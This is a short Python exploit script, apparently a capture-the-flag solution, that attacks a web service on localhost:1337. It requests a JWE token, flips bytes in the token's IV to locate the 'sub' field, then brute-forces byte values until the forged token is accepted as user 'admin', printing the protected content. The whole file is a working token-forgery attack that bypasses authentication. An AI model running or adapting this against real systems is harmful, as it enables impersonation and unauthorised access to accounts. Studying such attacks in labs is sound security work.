#!/usr/bin/env python
from base64 import b64encode, b64decode
from tqdm import tqdm
import requests
import os


if __name__ == "__main__":
    sub = "bdmin"
    URL = "http://localhost:1337/snippet/%s"
    response = requests.post(URL % sub, files=dict(file='bar'))
    jwe = response.json().get("token")
    header, _, iv, ct, _ = [b64decode(x) for x in jwe.split(".")]

    # Educated guess:
    # {"sub":<sub>,"is_admin":0, ...}
    # len: 7 (prefix) + 5 (bdmin) + 13 (perm), + N + 1 (suffix) = 64

    # jiggle "sub"-pin
    print("number of pins: ", len(iv))
    for idx in tqdm(range(7, len(iv))):
        pick = 0x01

        data = bytearray(iv)
        data[idx] ^= pick
        token = ".".join(b64encode(x).decode("utf8") for x in [header, b"", data, ct, b""])
        response = requests.get(URL % sub, headers={
            "Authorization": f"Bearer {token}", 
        })
        if response.status_code == 401:
            print(f"{idx} is binding ...")
            break

    for pin in range(5):
        sub = list("admin")
        sub[pin] = "_"
        sub = "".join(sub)
        URL = "http://localhost:1337/snippet/%s"
        response = requests.post(URL % sub, files=dict(file='bar'))
        jwe = response.json().get("token")
        header, _, iv, ct, _ = [b64decode(x) for x in jwe.split(".")]

        for pick in tqdm(range(255)):
            data = bytearray(iv)
            data[idx+pin] ^= pick
            token = ".".join(b64encode(x).decode("utf8") for x in [header, b"", data, ct, b""])
            response = requests.get(URL % "admin", headers={
                "Authorization": f"Bearer {token}", 
            })
            if response.ok:
                print(f"and we got this open:\n{response.text}")
                os._exit(0)

        print(f"{pin} is in a false gate")
